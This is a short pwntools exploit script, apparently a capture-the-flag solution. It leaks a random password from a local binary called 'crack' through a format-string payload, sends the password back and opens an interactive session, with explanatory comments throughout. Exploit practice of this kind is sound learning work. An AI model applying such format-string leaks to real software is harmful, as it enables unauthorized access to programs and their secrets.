#!/usr/bin/env python
from pwn import *

r = process('./crack')

#the addr of the global var
#from the source code we know that it get random number in main
#so we can use format string to leak the ramdom number it get on stack
password_p = 0x804a048

r.recvuntil('?')

#I add r as a label that make sure where to recv until
r.sendline(p32(password_p)+'r%10$s')
r.recvuntil('r')

#why we need to use u32?
#without unpack, the content we get will be hex string
#after u32, we can get decimal integer
#and that is also what we want to send to password
password = u32(r.recvuntil('r')[:4])
print password
r.recvuntil(':')

#now we can convert the int to string
r.sendline(str(password))
r.interactive()

